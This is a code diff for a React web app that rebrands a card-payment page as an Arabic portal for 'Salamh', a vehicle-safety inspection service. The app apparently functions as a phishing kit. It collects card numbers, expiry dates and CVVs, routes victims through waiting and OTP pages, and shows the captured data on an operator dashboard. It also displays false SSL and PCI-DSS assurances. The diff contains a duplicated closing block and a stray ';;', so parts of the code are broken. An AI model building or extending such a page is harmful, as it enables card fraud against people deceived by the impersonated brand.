+                      <span>رقم البطاقة الائتمانية</span>
+                    </label>
+                    <div className="relative">
+                      <input
+                        type="text"
+                        id="cardNumber"
+                        placeholder="4111 1111 1111 1111"
+                        className={`w-full rounded-xl border bg-white pl-4 pr-12 py-3 text-sm font-mono text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 transition text-left ${
+                          touched.cardNumber && errors.cardNumber
+                            ? 'border-rose-300 focus:ring-rose-500/10 focus:border-rose-500'
+                            : 'border-gray-200 focus:border-[#004d33] focus:ring-[#004d33]/15'
+                        }`}
+                        value={cardNumber}
+                        onChange={handleCardNumberChange}
+                        onBlur={() => handleBlur('cardNumber')}
+                      />
+                      {/* Small absolute logo selector on left of card input */}
+                      <div className="absolute left-4 top-1/2 -translate-y-1/2 select-none h-6 flex items-center">
+                        {cardType !== 'unknown' ? (
+                          <span className="text-[9px] font-black uppercase bg-slate-100 px-1.5 py-0.5 rounded border border-gray-200 text-[#004d33]">
+                            {cardType}
+                          </span>
+                        ) : (
+                          <CardIcon className="h-4 w-4 text-slate-300" />
+                        )}
+                      </div>
+                    </div>
+                    {touched.cardNumber && errors.cardNumber && (
+                      <p className="text-xs text-rose-600 flex items-center gap-1.5 mt-1 justify-start">
+                        <AlertCircle className="h-3.5 w-3.5" />
+                        <span>{errors.cardNumber}</span>
+                      </p>
+                    )}
+                  </div>
+
+                  {/* Row for Expiry and CVV */}
+                  <div className="grid grid-cols-2 gap-4">
+                    {/* Expiry Date */}
+                    <div className="space-y-1.5">
+                      <label htmlFor="expiry" className="flex items-center gap-1.5 text-xs font-bold text-slate-700 justify-start">
+                        <Calendar className="h-3.5 w-3.5 text-slate-400" />
+                        <span>تاريخ انتهاء الصلاحية</span>
+                      </label>
+                      <input
+                        type="text"
+                        id="expiry"
+                        placeholder="MM/YY"
+                        className={`w-full rounded-xl border bg-white px-4 py-3 text-sm font-mono text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 transition text-center ${
+                          touched.expiry && errors.expiry
+                            ? 'border-rose-300 focus:ring-rose-500/10 focus:border-rose-500'
+                            : 'border-gray-200 focus:border-[#004d33] focus:ring-[#004d33]/15'
+                        }`}
+                        value={expiry}
+                        onChange={handleExpiryChange}
+                        onBlur={() => handleBlur('expiry')}
+                      />
+                      {touched.expiry && errors.expiry && (
+                        <p className="text-xs text-rose-600 flex items-center gap-1.5 mt-1 justify-start">
+                          <AlertCircle className="h-3.5 w-3.5" />
+                          <span>{errors.expiry}</span>
+                        </p>
+                      )}
+                    </div>
+
+                    {/* CVV */}
+                    <div className="space-y-1.5">
+                      <label htmlFor="cvv" className="flex items-center gap-1.5 text-xs font-bold text-slate-700 justify-start">
+                        <Lock className="h-3.5 w-3.5 text-slate-400" />
+                        <span>الرمز السري (CVV)</span>
+                      </label>
+                      <input
+                        type="password"
+                        id="cvv"
+                        placeholder={cardType === 'amex' ? '1234' : '123'}
+                        className={`w-full rounded-xl border bg-white px-4 py-3 text-sm font-mono text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 transition text-center ${
+                          touched.cvv && errors.cvv
+                            ? 'border-rose-300 focus:ring-rose-500/10 focus:border-rose-500'
+                            : 'border-gray-200 focus:border-[#004d33] focus:ring-[#004d33]/15'
+                        }`}
+                        value={cvv}
+                        onChange={handleCvvChange}
+                        onFocus={() => setIsFlipped(true)}
+                        onBlur={() => {
+                          setIsFlipped(false);
+                          handleBlur('cvv');
+                        }}
+                      />
+                      {touched.cvv && errors.cvv && (
+                        <p className="text-xs text-rose-600 flex items-center gap-1.5 mt-1 justify-start">
+                          <AlertCircle className="h-3.5 w-3.5" />
+                          <span>{errors.cvv}</span>
+                        </p>
+                      )}
+                    </div>
+                  </div>
+
+                  {formError && (
+                    <div className="rounded-xl border border-rose-200 bg-rose-50 p-4 text-xs text-rose-700 flex items-center gap-2 animate-pulse justify-start">
+                      <AlertCircle className="h-4 w-4 shrink-0 text-rose-600" />
+                      <span>{formError}</span>
+                    </div>
+                  )}
+
+                  {/* Submit Button */}
+                  <button
+                    type="submit"
+                    disabled={isSubmitting}
+                    className="relative mt-6 flex w-full items-center justify-center gap-2 rounded-xl bg-[#004d33] hover:bg-[#003a26] px-4 py-4 text-sm font-bold text-white shadow-lg shadow-emerald-950/15 transition-all hover:scale-[1.01] active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none"
+                  >
+                    {isSubmitting ? (
+                      <>
+                        <RefreshCw className="h-4 w-4 animate-spin text-white" />
+                        <span>جاري تأكيد ومعالجة المعاملة...</span>
+                      </>
+                    ) : (
+                      <>
+                        <span className="font-sans font-extrabold text-base">دفع</span>
+                        <ArrowRight className="h-4 w-4 rotate-180 text-white/90" />
+                      </>
+                    )}
+                  </button>
+                </motion.div>
+              )}
+            </AnimatePresence>
+                </motion.div>
+              )}
+            </AnimatePresence>
+          </form>
+
+        </div>
       </div>
     </div>
   );
-};
+};;
 
 // Success Page Component
 const SuccessPage: React.FC = () => {
@@ -501,44 +755,50 @@ const SuccessPage: React.FC = () => {
         initial={{ opacity: 0, scale: 0.95 }}
         animate={{ opacity: 1, scale: 1 }}
         transition={{ duration: 0.4 }}
-        className="rounded-2xl border border-slate-800 bg-slate-900/40 p-8 text-center shadow-2xl backdrop-blur-lg"
+        className="rounded-2xl border border-gray-100 bg-white p-8 text-center shadow-xl relative overflow-hidden"
       >
-        <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 mb-6">
+        {/* Decorative Top Accent Bar */}
+        <div className="absolute top-0 inset-x-0 h-1.5 bg-[#004d33]" />
+
+        <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-full bg-emerald-50 text-[#004d33] border border-emerald-100 mb-6">
           <CheckCircle className="h-8 w-8" />
         </div>
 
-        <h2 className="text-2xl font-bold text-white tracking-tight">Payment Dispatched</h2>
-        <p className="text-sm text-slate-400 mt-2">
-          Your credit card submission has been logged successfully and routed for administrative authorization.
+        <h2 className="text-xl font-extrabold text-slate-800 tracking-tight font-sans">تمت عملية السداد بنجاح</h2>
+        <p className="text-xs text-slate-500 mt-2 font-medium">
+          تم تسجيل وقبول دفعتك بنجاح في بوابة منصة سلامة وتوجيهها للمطابقة والتدقيق النهائي.
         </p>
 
-        {/* Receipt Block */}
-        <div className="my-8 rounded-xl bg-slate-950/80 border border-slate-800/80 p-5 text-left space-y-3 font-mono text-xs">
-          <div className="flex justify-between border-b border-slate-900 pb-2">
-            <span className="text-slate-500">TRANSACTION ID</span>
-            <span className="text-indigo-400 font-bold">{tx.id}</span>
+        {/* Receipt Block (Arabic/English) */}
+        <div className="my-8 rounded-xl bg-gray-50 border border-gray-100 p-5 text-right space-y-3 font-sans text-xs dir-rtl">
+          <div className="flex justify-between items-center border-b border-gray-200/60 pb-2">
+            <span className="text-slate-500">الرقم المرجعي (Transaction ID):</span>
+            <span className="text-[#004d33] font-bold font-mono text-[11px]">{tx.id}</span>
           </div>
-          <div className="flex justify-between border-b border-slate-900 pb-2">
-            <span className="text-slate-500">CARD NUM</span>
-            <span className="text-white">{tx.cardNumber}</span>
+          <div className="flex justify-between items-center border-b border-gray-200/60 pb-2">
+            <span className="text-slate-500">رقم البطاقة (Card Number):</span>
+            <span className="text-slate-800 font-mono text-[11px]">{tx.cardNumber}</span>
           </div>
-          <div className="flex justify-between border-b border-slate-900 pb-2">
-            <span className="text-slate-500">CARDHOLDER</span>
-            <span className="text-white truncate max-w-[200px]">{tx.cardholderName.toUpperCase()}</span>
+          <div className="flex justify-between items-center border-b border-gray-200/60 pb-2">
+            <span className="text-slate-500">حامل البطاقة (Cardholder Name):</span>
+            <span className="text-slate-800 font-bold truncate max-w-[200px] text-[11px]">{tx.cardholderName.toUpperCase()}</span>
           </div>
-          <div className="flex justify-between border-b border-slate-900 pb-2">
-            <span className="text-slate-500">NETWORK</span>
-            <span className="text-white uppercase">{tx.cardType}</span>
+          <div className="flex justify-between items-center border-b border-gray-200/60 pb-2">
+            <span className="text-slate-500">شبكة الدفع (Payment Network):</span>
+            <span className="text-slate-800 uppercase font-extrabold text-[11px]">{tx.cardType}</span>
           </div>
-          <div className="flex justify-between border-b border-slate-900 pb-2">
-            <span className="text-slate-500">SUM TOTAL</span>
-            <span className="text-emerald-400 font-bold">${tx.amount.toFixed(2)}</span>
+          <div className="flex justify-between items-center border-b border-gray-200/60 pb-2">
+            <span className="text-slate-500">المبلغ الإجمالي (Amount Paid):</span>
+            <span className="text-[#004d33] font-black font-mono text-sm">{tx.amount.toFixed(2)} ر.س</span>
           </div>
-          <div className="flex justify-between">
-            <span className="text-slate-500">QUEUE STATUS</span>
-            <span className="inline-flex items-center space-x-1 text-[10px] bg-amber-500/10 text-amber-400 px-2 py-0.5 rounded border border-amber-500/20 font-bold">
-              <Clock className="h-2.5 w-2.5 animate-spin" />
-              <span>{tx.status.toUpperCase()}</span>
+          <div className="flex justify-between items-center">
+            <span className="text-slate-500">حالة التسوية (Settlement Status):</span>
+            <span className="inline-flex items-center gap-1 text-[10px] bg-emerald-50 text-[#004d33] px-2.5 py-1 rounded-full border border-emerald-100 font-extrabold">
+              <span className="relative flex h-1.5 w-1.5">
+                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75"></span>
+                <span className="relative inline-flex h-1.5 w-1.5 rounded-full bg-emerald-500"></span>
+              </span>
+              <span>{tx.status === 'APPROVED' ? 'مقبولة ومعتمدة' : tx.status}</span>
             </span>
           </div>
         </div>
@@ -547,16 +807,16 @@ const SuccessPage: React.FC = () => {
         <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
           <button
             onClick={() => navigate('/')}
-            className="flex items-center justify-center space-x-2 rounded-xl border border-slate-800 bg-slate-900/60 hover:bg-slate-900 px-4 py-3 text-xs font-semibold text-slate-300 transition"
+            className="flex items-center justify-center gap-2 rounded-xl border border-gray-200 bg-white hover:bg-gray-50 px-4 py-3 text-xs font-bold text-slate-700 transition"
           >
-            <span>Submit Another</span>
+            <span>سداد معاملة جديدة</span>
           </button>
           <button
             onClick={() => navigate('/dashboard')}
-            className="flex items-center justify-center space-x-2 rounded-xl bg-indigo-600 hover:bg-indigo-500 px-4 py-3 text-xs font-semibold text-white shadow-lg shadow-indigo-600/20 transition"
+            className="flex items-center justify-center gap-2 rounded-xl bg-[#004d33] hover:bg-[#003824] px-4 py-3 text-xs font-bold text-white shadow-md shadow-emerald-950/15 transition"
           >
-            <span>Manage Dashboard</span>
-            <ArrowRight className="h-3.5 w-3.5" />
+            <span>إدارة لوحة التحكم</span>
+            <ArrowRight className="h-3.5 w-3.5 rotate-180" />
           </button>
         </div>
       </motion.div>
@@ -1071,16 +1331,19 @@ const AdminDashboard: React.FC = () => {
   );
 };
 
-// Root Router wrapper
-export default function App() {
-  return (
-    <HashRouter>
-      <div className="min-h-screen bg-slate-950 font-sans text-slate-200 antialiased selection:bg-indigo-500/30 selection:text-white">
+// Router aware Content Component
+function AppContent() {
+  const location = useLocation();
+  const isAdminPath = location.pathname === '/dashboard' || location.pathname === '/admin-portal';
+
+  if (isAdminPath) {
+    return (
+      <div className="min-h-screen bg-slate-950 font-sans text-slate-200 antialiased selection:bg-emerald-500/30 selection:text-white">
         
         {/* Floating gradient ambient background orbs */}
         <div className="fixed inset-0 overflow-hidden pointer-events-none z-0">
-          <div className="absolute top-[-10%] left-[-15%] w-[50%] h-[50%] rounded-full bg-indigo-900/15 blur-[120px]" />
-          <div className="absolute bottom-[10%] right-[-10%] w-[40%] h-[40%] rounded-full bg-emerald-900/10 blur-[100px]" />
+          <div className="absolute top-[-10%] left-[-15%] w-[50%] h-[50%] rounded-full bg-emerald-900/10 blur-[120px]" />
+          <div className="absolute bottom-[10%] right-[-10%] w-[40%] h-[40%] rounded-full bg-teal-900/10 blur-[100px]" />
         </div>
 
         <div className="relative z-10 flex flex-col min-h-screen">
@@ -1094,12 +1357,13 @@ export default function App() {
               <Route path="/success" element={<SuccessPage />} />
               <Route path="/dashboard" element={<AdminDashboard />} />
               <Route path="/admin-portal" element={<AdminPortal />} />
+              <Route path="*" element={<Navigate to="/" replace />} />
             </Routes>
           </main>
 
           <footer className="border-t border-slate-900 bg-slate-950 py-6 text-center text-[11px] font-mono text-slate-500">
             <div className="mx-auto max-w-7xl px-4 sm:px-6 flex flex-col sm:flex-row justify-between items-center gap-2">
-              <p>© 2026 Smart Cart secure transaction services. Powered by Google AI Studio.</p>
+              <p>© 2026 Smart Cart Admin Terminal. Securely powered by Google AI Studio.</p>
               <div className="flex space-x-3 text-slate-600">
                 <span>SHA-256 Enabled</span>
                 <span>•</span>
@@ -1110,6 +1374,55 @@ export default function App() {
         </div>
 
       </div>
+    );
+  }
+
+  // Light Mode client-facing portal layout (Salamh style!)
+  return (
+    <div className="min-h-screen bg-gray-50/70 font-sans text-slate-800 antialiased selection:bg-[#004d33]/20 selection:text-[#004d33]">
+      
+      {/* Subtle light mode ambient decorations */}
+      <div className="fixed inset-0 overflow-hidden pointer-events-none z-0">
+        <div className="absolute top-[-20%] left-[-10%] w-[60%] h-[60%] rounded-full bg-emerald-500/5 blur-[160px]" />
+        <div className="absolute bottom-[5%] right-[-10%] w-[40%] h-[40%] rounded-full bg-sky-500/5 blur-[140px]" />
+      </div>
+
+      <div className="relative z-10 flex flex-col min-h-screen">
+        <Header />
+        
+        <main className="flex-grow">
+          <Routes>
+            <Route path="/" element={<CheckoutPage />} />
+            <Route path="/waiting" element={<WaitingApprovalPage />} />
+            <Route path="/otp" element={<OTPPage />} />
+            <Route path="/success" element={<SuccessPage />} />
+            <Route path="/dashboard" element={<AdminDashboard />} />
+            <Route path="/admin-portal" element={<AdminPortal />} />
+            <Route path="*" element={<Navigate to="/" replace />} />
+          </Routes>
+        </main>
+
+        <footer className="border-t border-gray-100 bg-white py-6 text-center text-xs text-slate-500 font-sans shadow-inner dir-rtl">
+          <div className="mx-auto max-w-7xl px-4 sm:px-6 flex flex-col sm:flex-row justify-between items-center gap-2">
+            <p className="font-medium">© 2026 سلامة لسلامة المركبات. جميع الحقوق محفوظة.</p>
+            <div className="flex space-x-3 space-x-reverse text-[11px] text-slate-400 font-sans">
+              <span>اتصال آمن ومشفّر SSL</span>
+              <span>•</span>
+              <span>بوابة دفع معتمدة ومطابقة لمواصفات PCI-DSS</span>
+            </div>
+          </div>
+        </footer>
+      </div>
+
+    </div>
+  );
+}
+
+// Root Router wrapper
+export default function App() {
+  return (
+    <HashRouter>
+      <AppContent />
     </HashRouter>
   );
 }
